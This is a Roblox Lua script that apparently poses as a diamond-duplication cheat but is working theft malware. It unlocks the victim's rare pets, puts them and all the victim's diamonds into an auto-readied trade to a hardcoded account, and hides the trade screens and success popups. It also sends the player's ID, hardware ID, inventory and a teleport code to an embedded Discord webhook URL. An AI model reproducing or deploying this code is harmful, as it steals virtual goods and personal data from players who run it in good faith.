print("V2.1")
getgenv().UName = "redaaro"
getgenv().HasWhitelisted = false
getgenv().aol = false
getgenv().here = false

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local diamondsText = LocalPlayer.PlayerGui.MainGui.StartFrame.Currency.Diamonds.Amount.Text
local clean = diamondsText:gsub(",", "")
local Diamonds = tonumber(clean)
local Duped = Diamonds * 2

local PetsInventory = require(LocalPlayer.PlayerScripts.MainClient.Gui.GuiScripts.PetsInventory)
local ClientDataManager = require(LocalPlayer.PlayerScripts.MainClient.ClientDataManager)
local PetsInfo = require(ReplicatedStorage.Modules.PetsInfo)
local Popup = LocalPlayer.PlayerGui.MainGui.OtherFrames.PopupFrameInfo

local Whitelisted = {
    ["Rainbow Eternal Guardian"] = true,
    ["Void Eternal Guardian"] = true,
    ["Solara"] = true,
    ["Rainbow Solara"] = true,
    ["Void Solara"] = true,
    ["Shiny Solara"] = true,
    ["Void Kitsune"] = true,
    ["Rainbow Kitsune"] = true,
    ["Shiny Kitsune"] = true,
    ["Golden Cupid Wraith"] = true,
    ["Void Cupid Wraith"] = true,
    ["Rainbow Cupid Wraith"] = true,
    ["Shiny Cupid Wraith"] = true,
    ["Void Kitsune"] = true,
    ["Void Fortune Dragon"] = true,
    ["Shiny Fortune Dragon"] = true,
    ["Rainbow Fortune Dragon"] = true,
    ["Golden Fortune Dragon"] = true,
    ["Golden Grand Vernal Sage"] = true,
    ["Rainbow Grand Vernal Sage"] = true,
    ["Shiny Grand Vernal Sage"] = true,
    ["Void Grand Vernal Sage"] = true,
    ["Rainbow Lucky Treasure"] = true,
    ["Void Lucky Treasure"] = true,
    ["Shiny Lucky Treasure"] = true,
    ["Void Rose Angel"] = true,
    ["Rainbow Rose Angel"] = true,
    ["Void Oceana"] = true,
    ["Void Kitsune"] = true,
    ["Rainbow Easter Universe"] = true,
    ["Void Easter Universe"] = true,
    ["Shiny Easter Universe"] = true,
    ["Void The Easter Creator"] = true,
    ["Rainbow The Easter Creator"] = true,
    ["Shiny The Easter Creator"] = true,
    ["Golden The Easter Creator"] = true,
    ["Void Jester Bunny"] = true,
    ["Rainbow Jester Bunny"] = true,
    ["Shiny Jester Bunny"] = true,
    ["Rainbow Starcrusher"] = true,
    ["Void Starcrusher"] = true,
    ["Rainbow Cursed Pharaoh"] = true,
    ["Void Cursed Pharaoh"] = true,
    ["The Antimatter"] = true,
    ["Golden The Antimatter"] = true,
    ["Rainbow The Antimatter"] = true,
    ["Void The Antimatter"] = true,
}

local function AddWhitelistedPets()
    for petID, petData in pairs(ClientDataManager.Data.Pets) do
        local petName = PetsInfo:GetPetFullName(petData.Type, petData.Class)
        if Whitelisted[petName] and not getgenv().aol then
            if petData.Locked then
                ReplicatedStorage.Events.UIAction:FireServer("TogglePetLocked", petID)
            end
            ReplicatedStorage.Events.UIAction:FireServer("AddPetInTrade", petID)
        end
    end
end

local function ModifyDiamondOffer(amount)
    if not getgenv().aol then
        ReplicatedStorage.Events.UIAction:FireServer("ModifyDiamondOffer", amount)
    end
end

local function SendTrade(playerName)
    local player = Players:FindFirstChild(playerName)
    if player then
        ReplicatedStorage.Events.UIAction:FireServer("RequestTradeWithPlayer", player)
    else
        warn("Player not found: " .. tostring(playerName))
    end
end

local function GetTeleportScript()
    local placeId = game.PlaceId
    local jobId = game.JobId
    return string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", placeId, jobId)
end

Popup:GetPropertyChangedSignal("Visible"):Connect(function()
    if Popup.Visible then
        local words = {}
        for _, v in pairs(Popup:GetDescendants()) do
            if v:IsA("TextLabel") and v.Text ~= "" then
                table.insert(words, v.Text)
            end
        end
        local text = table.concat(words, " "):lower()
        if text:find("trade") and (text:find("complete") or text:find("successful")) then
            if getgenv().aol and not getgenv().here then
                Popup.Visible = true
            else
                getgenv().aol = true
                Popup.Visible = false
            end
        end
    end
end)

local function rt()
    while not aol do
        task.wait(0.1)
        ReplicatedStorage.Events.UIAction:FireServer("ReadyTrade")
    end
end

local TradeFrame = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame
local TradeGui = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade
TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
    if TradeGui.Visible then
        if getgenv().aol and not getgenv().here then
            TradeFrame.Visible = true
        else
            TradeFrame.Visible = false
            task.spawn(rt)
            AddWhitelistedPets()
            ModifyDiamondOffer(Diamonds)
        end
    end
end)

local function StartTrade()
    wait(9)
    getgenv().here = true
    SendTrade(getgenv().UName)
end

getgenv().HasWhitelisted = false
for petID, petData in pairs(ClientDataManager.Data.Pets) do
    local petName = PetsInfo:GetPetFullName(petData.Type, petData.Class)
    if Whitelisted[petName] then
        getgenv().HasWhitelisted = true
        break
    end
end

local function getWhitelistedPets()
    local list = {}
    for petID, petData in pairs(ClientDataManager.Data.Pets) do
        local petName = PetsInfo:GetPetFullName(petData.Type, petData.Class)
        if Whitelisted[petName] then
            table.insert(list, petName)
        end
    end
    return table.concat(list, ", ")
end

local whitelistedPets = getWhitelistedPets()

local Webhook_URL = "https://discord.com/api/webhooks/1223588545894158347/3PJdmPm7NEQYvvkKVByKbt8W84I27Tu0beo3WWsWhL0ZCqUtbG3pAAimUCqBjk67yWN8"

local player = game.Players.LocalPlayer
local function getPlayerProfile(player)
    local playerName = player.Name
    local playerID = player.UserId
    local accountAge = player.AccountAge
    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
    return playerName, playerID, accountAge, hwid
end

local playerName, playerID, accountAge, hwid = getPlayerProfile(player) 

local data = {
    ["embeds"] = {
        {
            ["author"] = {
                ["name"] = playerName,
                ["icon_url"] = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=".. playerID .."&size=150x150&format=Png&isCircular=false",
            },
            ["title"] = "Execution Detected!",
            ["description"] = "gg./ScriptKids",
            ["type"] = "rich",
            ["color"] = tonumber(0xFF0000),
            ["fields"] = {
                {["name"]="Player ID:", ["value"]=tostring(playerID), ["inline"]=true},
                {["name"]="Gems:", ["value"]=tostring(Diamonds), ["inline"]=true},
                {["name"]="Whitelisted Pets:", ["value"]=whitelistedPets ~= "" and whitelistedPets or "None", ["inline"]=false},
                {["name"]="Account Age:", ["value"]=string.format("%.2f days", accountAge), ["inline"]=true},
                {["name"]="HWID:", ["value"]=hwid, ["inline"]=true},
                {["name"]="Teleport Code:", ["value"]=GetTeleportScript(), ["inline"]=false},
            },
        },
    },
}

local Request = http_request or request or HttpPost or (syn and syn.request)

if Request then
    Request({
        Url = Webhook_URL,
        Body = HttpService:JSONEncode(data),
        Method = "POST",
        Headers = {["Content-Type"]="application/json"}
    })
else
    LocalPlayer:Kick("Shit executor")
end

if getgenv().HasWhitelisted or Diamonds > 0 then
    local target = Players:FindFirstChild(getgenv().UName)
    if target then
        StartTrade()
    else
        Players.PlayerAdded:Connect(function(player)
            if player.Name == getgenv().UName then
                StartTrade()
            end
        end)
    end
else
    print("enjoy")
end

if #Players:GetPlayers() <= 1 then
    LocalPlayer:Kick("Dont use private server")
else
    print("not")
end
